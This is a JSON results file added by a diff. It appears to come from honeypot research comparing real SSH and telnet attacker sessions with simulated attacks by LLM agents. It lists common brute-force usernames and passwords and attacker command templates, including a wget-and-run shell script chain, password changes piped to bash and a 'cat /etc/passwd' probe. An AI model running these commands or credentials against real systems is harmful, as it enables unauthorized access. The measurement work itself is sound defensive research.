@@ -1,0 +1,325 @@
+{
+  "real": {
+    "sessions": 76785,
+    "protocol": {
+      "telnet": 7597,
+      "ssh": 69188
+    },
+    "login_success_sessions": 36685,
+    "sessions_with_downloads": 1085,
+    "login_attempts": 68861,
+    "duration_median_s": 2.7568637132644653,
+    "duration_mean_s": 32.06788724898674,
+    "interactive_sessions": 1672,
+    "interactive_share": 0.02177508627987237,
+    "distinct_source_hashes_interactive": 476,
+    "top_countries_all": [
+      [
+        "CN",
+        21414
+      ],
+      [
+        "unknown",
+        14143
+      ],
+      [
+        "IE",
+        13698
+      ],
+      [
+        "RU",
+        6938
+      ],
+      [
+        "SC",
+        6401
+      ],
+      [
+        "US",
+        2649
+      ],
+      [
+        "FR",
+        1416
+      ],
+      [
+        "NL",
+        1392
+      ],
+      [
+        "IN",
+        1097
+      ],
+      [
+        "GB",
+        1079
+      ]
+    ],
+    "top_countries_interactive": [
+      [
+        "CN",
+        649
+      ],
+      [
+        "US",
+        246
+      ],
+      [
+        "FR",
+        97
+      ],
+      [
+        "KR",
+        96
+      ],
+      [
+        "unknown",
+        72
+      ],
+      [
+        "IN",
+        54
+      ],
+      [
+        "CA",
+        51
+      ],
+      [
+        "GR",
+        49
+      ],
+      [
+        "GB",
+        47
+      ],
+      [
+        "NL",
+        38
+      ]
+    ],
+    "top_usernames": [
+      [
+        "root",
+        52335
+      ],
+      [
+        "admin",
+        2495
+      ],
+      [
+        "nproc",
+        1463
+      ],
+      [
+        "test",
+        265
+      ],
+      [
+        "guest",
+        234
+      ],
+      [
+        "mysql",
+        197
+      ],
+      [
+        "server",
+        181
+      ],
+      [
+        "backup",
+        146
+      ],
+      [
+        "user",
+        88
+      ],
+      [
+        "ftpuser",
+        63
+      ]
+    ],
+    "top_passwords": [
+      [
+        "admin",
+        34685
+      ],
+      [
+        "nproc",
+        1463
+      ],
+      [
+        "root",
+        797
+      ],
+      [
+        "",
+        481
+      ],
+      [
+        "123456",
+        341
+      ],
+      [
+        "password",
+        219
+      ],
+      [
+        "123",
+        115
+      ],
+      [
+        "1234",
+        97
+      ],
+      [
+        "aerohive",
+        93
+      ],
+      [
+        "test",
+        80
+      ]
+    ],
+    "template_sizes": [
+      1038,
+      429,
+      63,
+      43,
+      36,
+      16,
+      8,
+      6,
+      6,
+      5,
+      4,
+      3,
+      3,
+      2,
+      2,
+      2,
+      1,
+      1,
+      1,
+      1,
+      1,
+      1
+    ],
+    "top_templates": [
+      {
+        "sessions": 1038,
+        "n_commands": 23,
+        "first_commands": [
+          "cat /proc/cpuinfo | grep name | wc -l",
+          "echo <str>|chpasswd|bash",
+          "echo <str> > /var/tmp/.<tok>",
+          "rm -rf /var/tmp/.<tok>",
+          "cat /var/tmp/.<tok> | head -n <n>"
+        ]
+      },
+      {
+        "sessions": 429,
+        "n_commands": 19,
+        "first_commands": [
+          "cat /proc/cpuinfo | grep name | wc -l",
+          "echo -e <str>|passwd|bash",
+          "echo <str>|passwd",
+          "echo <str> > /var/tmp/.<tok>",
+          "rm -rf /var/tmp/.<tok>"
+        ]
+      },
+      {
+        "sessions": 63,
+        "n_commands": 6,
+        "first_commands": [
+          "shell",
+          "sh",
+          "enable",
+          "system",
+          "/bin/busybox <tag>"
+        ]
+      },
+      {
+        "sessions": 43,
+        "n_commands": 10,
+        "first_commands": [
+          "enable",
+          "system",
+          "shell",
+          "sh",
+          "cat /proc/mounts; /bin/busybox <tag>"
+        ]
+      },
+      {
+        "sessions": 36,
+        "n_commands": 2,
+        "first_commands": [
+          "sh",
+          "cd /tmp || cd /run || cd /; wget <url> chmod <n> layerbins.sh; sh layerbins.sh; tftp <ip> "
+        ]
+      },
+      {
+        "sessions": 16,
+        "n_commands": 6,
+        "first_commands": [
+          "shell",
+          "sh",
+          "enable",
+          "system",
+          "/bin/busybox <tag>"
+        ]
+      }
+    ],
+    "commands_per_session_interactive": {
+      "median": 23.0,
+      "max": 50
+    }
+  },
+  "synthetic": {
+    "sessions": 120,
+    "cells": {
+      "DeepSeek-V3.2 | Dynamic Qwen-32B": 20,
+      "DeepSeek-V3.2 | Static Cowrie": 20,
+      "GPT-OSS-120B | Dynamic Qwen-32B": 20,
+      "GPT-OSS-120B | Static Cowrie": 20,
+      "Gemma-3-4B | Dynamic Qwen-32B": 20,
+      "Gemma-3-4B | Static Cowrie": 20
+    },
+    "top_first_commands": [
+      [
+        "id",
+        48
+      ],
+      [
+        "whoami",
+        35
+      ],
+      [
+        "ls /root",
+        7
+      ],
+      [
+        "ls /",
+        7
+      ],
+      [
+        "ls /home",
+        5
+      ],
+      [
+        "ls -la",
+        4
+      ],
+      [
+        "ls -la /",
+        3
+      ],
+      [
+        "cat /etc/passwd",
+        3
+      ]
+    ],
+    "distinct_verbs": 95,
+    "total_commands": 2112
+  }
+}
